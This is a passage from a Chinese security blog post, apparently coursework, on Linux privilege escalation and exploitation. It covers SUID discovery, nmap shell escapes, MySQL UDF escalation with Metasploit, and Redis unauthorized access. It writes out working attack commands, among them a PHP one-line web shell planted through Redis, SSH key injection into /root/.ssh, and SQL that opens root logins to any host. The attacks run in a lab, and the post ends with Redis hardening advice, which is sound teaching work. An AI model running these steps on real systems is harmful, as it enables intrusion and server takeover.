<div class="hljs"><pre><code class="hljs routeros"><span class="hljs-builtin-name">find</span> / -user root -perm -4000 -<span class="hljs-builtin-name">print</span> 2&gt;/dev/<span class="hljs-literal">null</span>
<span class="hljs-builtin-name">find</span> / -perm <span class="hljs-attribute">-u</span>=s -type f 2&gt;/dev/<span class="hljs-literal">null</span>
<span class="hljs-builtin-name">find</span> / -user root -perm -4000 -exec ls -ldb &#123;&#125; ;</code></pre></div>

<p>也可以使用 <code>sudo -l</code> 命令列出当前用户可执行的命令</p>
<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210425233650739.png" srcset="/img/loading.gif" alt="image-20210425233650739" style="zoom:50%;">

<h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p><strong>nmap</strong></p>
<p>nmap（2.02-5.21）存在交换模式，可利用提权</p>
<div class="hljs"><pre><code class="hljs ada">nmap <span class="hljs-comment">--interactive</span></code></pre></div>

<p>之后执行:</p>
<div class="hljs"><pre><code class="hljs apache"><span class="hljs-attribute">nmap</span>&gt; !sh
<span class="hljs-attribute">sh</span>-<span class="hljs-number">3</span>.<span class="hljs-number">2</span># whoami
<span class="hljs-attribute">root</span></code></pre></div>

<p>msf中的模块为：</p>
<div class="hljs"><pre><code class="hljs awk">exploit<span class="hljs-regexp">/unix/</span>local/setuid_nmap</code></pre></div>

<p>较新版可使用 <code>--script</code> 参数：</p>
<div class="hljs"><pre><code class="hljs arcade">echo <span class="hljs-string">&quot;os.execute(&#x27;/bin/sh&#x27;)&quot;</span> &gt; <span class="hljs-regexp">/tmp/</span>shell.nse &amp;&amp; sudo nmap --script=<span class="hljs-regexp">/tmp/</span>shell.nse</code></pre></div>

<p>kali nmap 7.7 提权成功：</p>
<p><img src="https://jlkl.github.io/2020/01/27/Web_15/20200127154030.png" srcset="/img/loading.gif" alt></p>
<h2 id="mysql-UDF提权"><a href="#mysql-UDF提权" class="headerlink" title="mysql UDF提权"></a>mysql UDF提权</h2><h3 id="UDF提权原理"><a href="#UDF提权原理" class="headerlink" title="UDF提权原理"></a>UDF提权原理</h3><p>UDF指的是用户自定义函数，用户可以对数据库所使用的函数进行一个扩展（利用dll文件），从而定制一些符合自己需求的函数，但是同样的，当黑客获取了数据库的root用户的一个权限时，即使所在的系统权限很低，也可以使用UDF来自定义一个执行系统命令的函数，但是执行权限为管理员权限，从而可以用来添加管理员账户，远程连接。</p>
<p>这里使用mysql进行复现。</p>
<p>首先我们需要拥有mysql数据库的root权限，由于mysql的版本不同，udf提权的方式也不同。</p>
<p>mysql版本&gt;5.1 需要在mysql的安装目录下创建 lib\plugin 这个文件夹（默认不存在），之后将把dll文件放在这个文件夹中；<br>mysql版本&lt;5.1 需要将dll文件放在 C:\windows\或C:\windows\system32。</p>
<p>然后加载函数，就可以使用了。</p>
<p>注意：提权所用的dll在sqlmap或msf中都有，要与受害机的系统与数据库位数进行匹配。</p>
<p><img src="https://img-blog.csdnimg.cn/20200806175635321.png" srcset="/img/loading.gif" alt="在这里插入图片描述"></p>
<h3 id="msf提权演示"><a href="#msf提权演示" class="headerlink" title="msf提权演示"></a>msf提权演示</h3><p>这里主要演示大于5.1的版本。<br>所以接下来创建目录，关于创建目录，下面的第二篇参考提供了一个使用NTFS ADS流的方式，大家可以进行尝试，这里我直接手工进行创建。</p>
<p>然后我们需要把自定义好的函数，也就是执行系统命令的函数加载进数据库中，我们需要先将定义好的一个dll放入lib\plugin这个文件夹，这里如果无法上传文件，我们可以创建一个数据表，将dll中的数据十六进制编码，之后在通过读取的方式写入到lib\plugin\udf.dll文件中，这样也是可以达到上传文件的效果的。<br>写入文件有一个前提，就是secure_file_priv这个选项需要为空值，这样才可以加载或写入文件。</p>
<p><img src="https://img-blog.csdnimg.cn/20200806173131434.png" srcset="/img/loading.gif" alt="在这里插入图片描述"></p>
<p>NULL表示不可以写入<br>修改mysql.ini文件，使其为空值</p>
<p><img src="https://img-blog.csdnimg.cn/20200806173252232.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21pbmdfeHQ=,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" alt="在这里插入图片描述"></p>
<p>这样一来就可以写入文件了。</p>
<p>但是这里我们利用msf进行攻击，需要远程连接该主机的数据库，所以要提前查看，该数据库是否可以远程连接。</p>
<p><img src="https://img-blog.csdnimg.cn/20200806173304225.png" srcset="/img/loading.gif" alt="在这里插入图片描述"></p>
<p>这里发现root用户的连接对象都是本地，可以使用sql语句进行修改，将其改为允许远程连接</p>
<div class="hljs"><pre><code class="hljs n1ql"><span class="hljs-keyword">update</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">set</span> host = <span class="hljs-string">&#x27;%&#x27;</span> <span class="hljs-keyword">where</span> <span class="hljs-keyword">user</span> = <span class="hljs-string">&#x27;root&#x27;</span>;</code></pre></div>


<p>这条语句来修改连接对象为所有主机<br>之后尝试使用msf进行攻击。</p>
<p>进入msf，加载exploit/multi/mysql/mysql_udf_payload模块</p>
<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210425233528810.png" srcset="/img/loading.gif" alt="image-20210425233528810" style="zoom:67%;">

<p>这里的需要mysql数据库的账号和密码，以及连接的主机。<br>设置完之后，尝试攻击。<br>攻击完之后，在受害机的lib\plugin目录下将会生成一个dll文件。<br>之后查看已载入的函数并尝试执行。</p>
<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210425233540791.png" srcset="/img/loading.gif" alt="image-20210425233540791" style="zoom:50%;">

<p>执行成功返回0。<br>由于该命令没有回显，不方便，所以我们需要手动的加载一个有回显的函数。</p>
<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210425233551282.png" srcset="/img/loading.gif" alt="image-20210425233551282" style="zoom:67%;">

<p>这里的dll文件的名称是msf随机的，利用该条命令载入了sys_eval函数</p>
<p><img src="https://img-blog.csdnimg.cn/20200806174919488.png" srcset="/img/loading.gif" alt="在这里插入图片描述"></p>
<p>可以看到该条函数成功将执行结果回显出来了。</p>
<h1 id="redis未授权访问漏洞利用"><a href="#redis未授权访问漏洞利用" class="headerlink" title="redis未授权访问漏洞利用"></a>redis未授权访问漏洞利用</h1><h2 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><p>Redis因配置不当就会导致未授权访问。在默认情况下，Redis会绑定在 0.0.0.0:6379。如果没有采用相关的策略，比如添加防火墙规则避免其他非信任来源 ip 访问等，这样 Redis 服务直接暴露到公网上，如果在没有设置密码认证（一般为空）的情况下，会导致任意用户在可以访问到目标服务器的情况下未授权访问 Redis 以及读取 Redis 的数据。攻击者在未授权访问 Redis 的情况下，还可以利用 Redis 自身提供的config 命令进行写文件操作，攻击者可以成功将自己的ssh公钥写入目标服务器的 /root/.ssh 文件夹的authotrized_keys 文件中，进而可以使用对应私钥直接使用ssh服务登录目标服务器。</p>
<p>该漏洞的产生条件有以下两点：</p>
<p>1.redis绑定在 0.0.0.0:6379，且没有进行添加防火墙规则避免其他非信任来源ip访问等相关安全策略，直接暴露在公网；<br>2.没有设置密码认证（一般为空），可以免密码(认证)远程登录redis服务。</p>
<p>漏洞危害：<br>(1) 攻击者无需认证访问到内部数据，可能导致敏感信息泄露，黑客也可以恶意执行flushall来清空所有数据；<br>(2) 攻击者可通过执行lua代码，或通过数据备份功能往磁盘写入后门文件；<br>(3) 最严重的情况，如果Redis以root身份运行，黑客可以给root账户写入SSH公钥文件，直接通过SSH登录受害服务器;</p>
<h2 id="环境搭建-1"><a href="#环境搭建-1" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>在kali中安装redis 3.2.0</p>
<div class="hljs"><pre><code class="hljs awk">创建redis安装目录
mkdir <span class="hljs-regexp">/usr/</span>local/redis
cd <span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/redis/</span>
wget http:<span class="hljs-regexp">//</span>download.redis.io<span class="hljs-regexp">/releases/</span>redis-<span class="hljs-number">3.2</span>.<span class="hljs-number">0</span>.tar.gz
<span class="hljs-regexp">//</span>获取redis压缩包
tar xzf redis-<span class="hljs-number">3.2</span>.<span class="hljs-number">0</span>.tar.gz
cd <span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/redis/</span>redis-<span class="hljs-number">3.2</span>.<span class="hljs-number">0</span>
make <span class="hljs-comment">#编译安装</span></code></pre></div>

<p>安装完成之后需要修改配置文件，配置允许可以远程访问。</p>
<p>vim redis.conf #修改默认配置文件</p>
<p>在bind 127.0.0.1前面加上#号进行注释，并将protected-mode设置为no。</p>
<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210414153138387.png" srcset="/img/loading.gif" alt="image-20210414153138387" style="zoom:67%;">



<p>然后进入src目录，将redis-server和redis-cli拷贝到/usr/bin目录下（这样启动redis-server和redis-cli就不用每次都进入安装目录了），并将redis.conf拷贝到/etc/目录下。</p>
<div class="hljs"><pre><code class="hljs awk">cd src
cp redis-cli <span class="hljs-regexp">/usr/</span>bin
cp redis-server <span class="hljs-regexp">/usr/</span>bin
cp redis.conf <span class="hljs-regexp">/etc/</span></code></pre></div>

<p>开启redis服务</p>
<div class="hljs"><pre><code class="hljs awk">redis-server <span class="hljs-regexp">/etc/</span>redis.conf</code></pre></div>

<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210414153309311.png" srcset="/img/loading.gif" alt="image-20210414153309311" style="zoom:50%;">

<p>第一台作为攻击机即可，然后将这台主机克隆作为目标主机</p>
<p>攻击机</p>
<p>ip:192.168.164.145</p>
<p>目标主机</p>
<p>ip:192.168.164.23</p>
<p>首先确定目标主机是否开启redis服务，使用nmap扫描端口6379</p>
<p>如下，显示了目标使用的redis版本以及服务器的信息</p>
<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210413225839841.png" srcset="/img/loading.gif" alt="image-20210413225839841" style="zoom:67%;">



<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="1-写入木马文件"><a href="#1-写入木马文件" class="headerlink" title="1.写入木马文件"></a>1.写入木马文件</h3><p>首先进入redis安装目录的src中执行</p>
<div class="hljs"><pre><code class="hljs avrasm">./redis-<span class="hljs-keyword">cli</span> -h <span class="hljs-number">192.168</span><span class="hljs-number">.164</span><span class="hljs-number">.23</span></code></pre></div>

<p>成功控制目标的redis服务</p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210413230028713.png" srcset="/img/loading.gif" alt="image-20210413230028713"></p>
<p>向其网站根目录中写入一句话木马</p>
<div class="hljs"><pre><code class="hljs php-template"><span class="xml">config set dir /var/www/html</span>

<span class="xml">config set dbfilename shell.php</span>

<span class="xml">set x &quot;</span><span class="php"><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]);<span class="hljs-meta">?&gt;</span></span><span class="xml">&quot;</span>

<span class="xml">save </span></code></pre></div>

<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210413230359912.png" srcset="/img/loading.gif" alt="image-20210413230359912"></p>
<p>save成功后，目标主机的网站根目录就出现了木马文件</p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210413230408356.png" srcset="/img/loading.gif" alt="image-20210413230408356"></p>
<p>使用蚁剑连接</p>
<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210413230614612.png" srcset="/img/loading.gif" alt="image-20210413230614612" style="zoom:50%;">





<h3 id="2-写ssh-keygen公钥然后使用私钥进行登陆"><a href="#2-写ssh-keygen公钥然后使用私钥进行登陆" class="headerlink" title="2.写ssh-keygen公钥然后使用私钥进行登陆"></a>2.写ssh-keygen公钥然后使用私钥进行登陆</h3><p>写入ssh公钥后可以在本机存储对应的ssh密钥，然后直接无密码登陆。</p>
<p>首先生成公钥密钥文件</p>
<div class="hljs"><pre><code class="hljs awk">ssh-keygen -t rsa

cat <span class="hljs-regexp">/root/</span>.ssh/id_rsa.pub</code></pre></div>

<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210414131910830.png" srcset="/img/loading.gif" alt="image-20210414131910830" style="zoom:50%;">

<p>继续使用命令</p>
<div class="hljs"><pre><code class="hljs swift">config <span class="hljs-keyword">set</span> dir <span class="hljs-operator">/</span>root<span class="hljs-operator">/</span>.ssh<span class="hljs-operator">/</span>

config <span class="hljs-keyword">set</span> authorized_keys

<span class="hljs-keyword">set</span> x <span class="hljs-string">&quot;<span class="hljs-subst">\n</span><span class="hljs-subst">\n</span><span class="hljs-subst">\n</span>\id_rsa.pub的内容<span class="hljs-subst">\n</span><span class="hljs-subst">\n</span><span class="hljs-subst">\n</span>&quot;</span>

save</code></pre></div>

<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210414131805309.png" srcset="/img/loading.gif" alt="image-20210414131805309" style="zoom: 67%;">



<p>使用公钥连接</p>
<div class="hljs"><pre><code class="hljs css">ssh -<span class="hljs-selector-tag">i</span> id_rsa root<span class="hljs-keyword">@192</span>.168.164.23</code></pre></div>

<p>这里的id_rsa与创建ssh密钥输入的内容一致</p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210414133547275.png" srcset="/img/loading.gif" alt="image-20210414133547275"></p>
<h3 id="3-利用计划任务反弹shell"><a href="#3-利用计划任务反弹shell" class="headerlink" title="3.利用计划任务反弹shell"></a>3.利用计划任务反弹shell</h3><p>只能在centos环境中利用因为centos环境中的计划任务文件可以忽略乱码，ubuntu环境因为无法忽略文件中的乱码因此无法使用</p>
<h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p>1、限制登录ip<br>在redis.conf文件中设置redis访问的ip白名单，如果项目允许的话最好设置为只允许本地访问。</p>
<p>2、添加密码<br>在redis.conf配置文件中找到requirepass并去掉前面的#， 然后在后面设置一个高强度的密码。因为redis验证密码的速度很快，给攻击者进行高速的爆破密码提供了一个良好的基础，所以设置一个高强度的密码不仅解决了未授权的问题还能防止密码爆破。</p>
<p>3、修改默认端口</p>

            </div>
            <hr>
            <div>
              <div class="post-metas mb-3">
                
                  <div class="post-meta mr-3">
                    <i class="iconfont icon-category"></i>
                    
                      <a class="hover-with-bg" href="/categories/homework/">homework</a>
                    
                  </div>
                
                
                  <div class="post-meta">
                    <i class="iconfont icon-tags"></i>
                    
                      <a class="hover-with-bg" href="/tags/sql/">sql</a>
                    
                      <a class="hover-with-bg" href="/tags/xss/">xss</a>
                    
                      <a class="hover-with-bg" href="/tags/xxe/">xxe</a>
                    
                  </div>
                
              </div>
              
                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！</p>
              
              
                <div class="post-prevnext row">
                  <article class="post-prev col-6">
                    
                    
                      <a href="/2021/03/21/mycms/">
                        <i class="iconfont icon-arrowleft"></i>
                        <span class="hidden-mobile">mycms</span>
                        <span class="visible-mobile">上一篇</span>
                      </a>
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/2020/12/23/%E5%AF%86%E7%A0%81%E5%AD%A6/">
                        <span class="hidden-mobile">密码学</span>
                        <span class="visible-mobile">下一篇</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
              <!-- Comments -->
              <article class="comments" id="comments">
                
                
  <div id="vcomments"></div>
  <script type="text/javascript">
    function loadValine() {
      addScript('https://cdn.jsdelivr.net/gh/HCLonely/Valine@latest/dist/Valine.min.js', function () {
        new Valine({
          el: "#vcomments",
          app_id: "2rPljbm5WOxA9BCPXqy3VE5y-gzGzoHsz",
          app_key: "SCoIn2Qp99a7ITtPhkAi6Chw",
          placeholder: "说点什么吧~~~",
          path: window.location.pathname,
          avatar: "retro",
          meta: ["nick","mail","link"],
          pageSize: "10",
          lang: "zh-CN",
          highlight: true,
          recordIP: false,
          serverURLs: "",
          master: "4cd096660a71d786a2a4d9d0bb4e8996",
          friends: "b275f0fc8103331da645a878cf60f841",
          tagMeta: ["博主","友人","访客"],
        });
      });
    }
    waitElementVisible('vcomments', loadValine);
  </script>
  <noscript>Please enable JavaScript to view the <a target="_blank" href="https://valine.js.org" rel="nofollow noopener noopener">comments
      powered by Valine.</a></noscript>


              </article>
            
          </article>
        </div>
      </div>
    </div>
    
      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
        <div id="toc">
  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
  <div id="tocbot"></div>
</div>

      </div>
    
  </div>
</div>

<!-- Custom -->

  <div class="col-lg-7 mx-auto nopadding-md">
    <div class="container custom post-content mx-auto">
      <img src="https://octodex.github.com/images/jetpacktocat.png" srcset="/img/loading.gif" class="rounded mx-auto d-block mt-5" style="width:150px; height:150px;">
    </div>
  </div>


    
  </main>

  
    <a id="scroll-top-button" href="#" role="button">
      <i class="iconfont icon-arrowup" aria-hidden="true"></i>
    </a>
  

  
    <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v"
                 for="local-search-input">关键词</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>
  

  

  <footer class="text-center mt-5 py-3">
  <div class="footer-content">
     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
  </div>
  
  <div class="statistics">
    
    

    
      
        <!-- 不蒜子统计PV -->
        <span id="busuanzi_container_site_pv" style="display: none">
            总访问量 
            <span id="busuanzi_value_site_pv"></span>
             次
          </span>
      
      
        <!-- 不蒜子统计UV -->
        <span id="busuanzi_container_site_uv" style="display: none">
            总访客数 
            <span id="busuanzi_value_site_uv"></span>
             人
          </span>
      
    
  </div>


  

  
</footer>

<!-- SCRIPTS -->
<script  src="https://cdn.staticfile.org/jquery/3.4.1/jquery.min.js" ></script>
<script  src="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/js/bootstrap.min.js" ></script>
<script  src="/js/debouncer.js" ></script>
<script  src="/js/main.js" ></script>

<!-- Plugins -->


  
    <script  src="/js/lazyload.js" ></script>
  



  



  <script defer src="https://cdn.staticfile.org/clipboard.js/2.0.6/clipboard.min.js" ></script>
  <script  src="/js/clipboard-use.js" ></script>



  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>





  <script  src="https://cdn.staticfile.org/tocbot/4.11.1/tocbot.min.js" ></script>
  <script>
    $(document).ready(function () {
      var boardCtn = $('#board-ctn');
      var boardTop = boardCtn.offset().top;

      tocbot.init({
        tocSelector: '#tocbot',
        contentSelector: '#post-body',
        headingSelector: 'h1,h2,h3,h4,h5,h6',
        linkClass: 'tocbot-link',
        activeLinkClass: 'tocbot-active-link',
        listClass: 'tocbot-list',
        isCollapsedClass: 'tocbot-is-collapsed',
        collapsibleClass: 'tocbot-is-collapsible',
        collapseDepth: 0,
        scrollSmooth: true,
        headingsOffset: -boardTop
      });
      if ($('.toc-list-item').length > 0) {
        $('#toc').css('visibility', 'visible');
      }
    });
  </script>



  <script  src="https://cdn.staticfile.org/typed.js/2.0.11/typed.min.js" ></script>
  <script>
    var typed = new Typed('#subtitle', {
      strings: [
        '  ',
        "net_a_and_d&nbsp;",
      ],
      cursorChar: "_",
      typeSpeed: 70,
      loop: true,
    });
    typed.stop();
    $(document).ready(function () {
      $(".typed-cursor").addClass("h2");
      typed.start();
    });
  </script>



  <script  src="https://cdn.staticfile.org/anchor-js/4.2.2/anchor.min.js" ></script>
  <script>
    anchors.options = {
      placement: "right",
      visible: "hover",
      
      icon: "§"
      
    };
    var el = "h1,h2,h3,h4,h5,h6".split(",");
    var res = [];
    for (item of el) {
      res.push(".markdown-body > " + item)
    }
    anchors.add(res.join(", "))
  </script>



  <script  src="/js/local-search.js" ></script>
  <script>
    var path = "/local-search.xml";
    var inputArea = document.querySelector("#local-search-input");
    inputArea.onclick = function () {
      searchFunc(path, 'local-search-input', 'local-search-result');
      this.onclick = null
    }
  </script>



  <script  src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js" ></script>
  <link  rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css" />

  <script>
    $('#post img:not(.no-zoom img, img[no-zoom]), img[zoom]').each(
      function () {
        var element = document.createElement('a');
        $(element).attr('data-fancybox', 'images');
        $(element).attr('href', $(this).attr('src'));
        $(this).wrap(element);
      }
    );
  </script>












  

  

  

  

  

  



<div class="text-center py-1">   
  <div>
    <span>Copyright © 2020</span></a>
    <a href="http://sunzy.icu/" target="_blank" rel="nofollow noopener">
     <span>my blog</span></a>    <br>
  </div>
<div>
  <span id="timeDate">载入天数...</span>
  <span id="times">载入时分秒...</span>
  <script>
  var now = new Date();
  function createtime(){
      var grt= new Date("03/02/2020 00:00:00");//此处修改你的建站时间或者网站上线时间
      now.setTime(now.getTime()+250);
      days = (now - grt ) / 1000 / 60 / 60 / 24;
      dnum = Math.floor(days);
      hours = (now - grt ) / 1000 / 60 / 60 - (24 * dnum);
      hnum = Math.floor(hours);
      if(String(hnum).length ==1 ){
          hnum = "0" + hnum;
      }
      minutes = (now - grt ) / 1000 /60 - (24 * 60 * dnum) - (60 * hnum);
      mnum = Math.floor(minutes);
      if(String(mnum).length ==1 ){
                mnum = "0" + mnum;
      }
      seconds = (now - grt ) / 1000 - (24 * 60 * 60 * dnum) - (60 * 60 * hnum) - (60 * mnum);
      snum = Math.round(seconds);
      if(String(snum).length ==1 ){
                snum = "0" + snum;
      }
      document.getElementById("timeDate").innerHTML = "🚀 for&nbsp"+dnum+"&nbspdays";  //此次自定义显示内容
      document.getElementById("times").innerHTML = hnum + "&nbsphr&nbsp" + mnum + "&nbspmin&nbsp" + snum + "&nbspsec";
  }  //此次自定义显示内容
  setInterval("createtime()",250);
  </script>
</div>

<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"model":{"jsonPath":"/live2dw/assets/wanko.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":false},"log":false});</script></body>
</html>
